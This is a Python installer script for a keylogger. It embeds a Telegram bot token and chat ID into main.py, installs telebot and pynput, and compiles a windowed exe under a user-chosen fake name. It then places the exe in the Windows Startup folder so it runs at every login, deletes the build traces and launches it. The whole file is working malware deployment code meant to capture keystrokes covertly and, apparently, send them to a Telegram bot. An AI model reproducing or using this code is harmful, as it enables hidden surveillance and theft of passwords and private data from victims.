import getpass
import os
import shutil
from time import sleep


def install(token, chatid, fakename):
    code = []
    with open('main.py') as file:
        while True:
            line = file.readline()
            if not line:
                break
            code.append(line)

    path = f'C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'

    if fakename == '':
        fakename = 'main'

    code[7] = f"token = '{token}'\n"
    code[8] = f"chatID = '{chatid}'\n"
    
    with open('main.py', 'w+') as file:
        for line in code:
            file.write(line)
    
    print('\nInstalling dependencies...\n')
    sleep(0.3)
    os.system('pip install telebot pynput pyinstaller')

    print('\nConverting file to exe...\n')
    sleep(0.3)
    os.system('pyinstaller --noconfirm --onefile --windowed --icon "icon.ico"  "main.py"')
    
    print('\nChanging file name...\n')
    sleep(0.3)
    os.rename('dist/main.exe', f'{fakename}.exe')

    print('\nAdding file to autoload...\n')
    sleep(0.3)
    os.rename(f'{fakename}.exe', f'{path}/{fakename}.exe')

    print('\nClearing installation folder...\n')
    sleep(0.3)
    os.remove('main.spec')
    os.rmdir('dist')
    shutil.rmtree('build')

    print('\nStarting the keylogger...\n')
    sleep(0.3)
    os.system(f'{path}/{fakename}.exe')

    a = input('\nKeylogger installed successfully! :D\nPress enter to continue.')

if __name__ == '__main__':
    
    try:
        with open('conf') as file:
            conf = file.read()

        conf = conf.split('\n')    
    
        token = conf[0]
        chatid = conf[1]
        fakename = conf[2]

    except BaseException:    
        token = input('Input tgbot token\n>>')
        chatid = input('Input chatID\n>>')
        fakename = input('Input exe file name\n>>')
    
    install(token, chatid, fakename)